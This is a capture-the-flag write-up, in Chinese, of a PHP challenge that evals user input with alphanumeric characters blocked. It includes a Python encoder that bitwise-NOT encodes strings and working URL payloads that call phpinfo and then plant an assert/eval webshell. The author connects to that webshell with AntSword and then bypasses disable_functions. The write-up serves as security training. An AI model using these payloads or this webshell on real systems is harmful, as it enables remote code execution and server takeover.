![[Pasted image 20221221195120.png|500]]

---
```php
<?php
error_reporting(0);
if(isset($_GET['code'])){
	$code=$_GET['code'];
	if(strlen($code)>40){
		die("This is too Long.");
	}
	if(preg_match("/[A-Za-z0-9]+/",$code)){
        die("NO.");
    }
    @eval($code);
}
else{
    highlight_file(__FILE__);
}

// ?>
```

朴实无华.jpg

RCE，但是无字母数字QAQ

限制长度的话，估计是要转换成处理另一个参数了

构造目标是`phpinfo();`

感觉异或会太长，通过取反构造

```python
import re
s = input()gao bu lai
for ch in s:
    print('%%%02x' % (~ord(ch) + 256), end='')
```

```shell
$ python tmp.py
phpinfo
%8f%97%8f%96%91%99%90
```

```php
/?code=(~%8f%97%8f%96%91%99%90)();
```
> **disable_functions**
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl

这个怕不是禁得啥都不剩了QAQ

好像还有`assert`

构造`assert(eval($_POST['a']));`

```
assert ==> %9e%8c%8c%9a%8d%8b
eval($_POST['a']) ==> %9a%89%9e%93%d7%db%a0%af%b0%ac%ab%a4%d8%9e%d8%a2%d6
```

```php
/?code=(~%9e%8c%8c%9a%8d%8b)(~%9a%89%9e%93%d7%db%a0%af%b0%ac%ab%a4%d8%9e%d8%a2%d6);
```

`Antsword`连接

![[Pasted image 20221222114909.png|1000]]

直接用轮子绕过`disable_functions`（嗯，绝对不是`LD_PRELOAD`搞不来～）

![[Pasted image 20221222120344.png]]

#Web #PHP #绕过 #编码 #RCE #disable_functions #antsword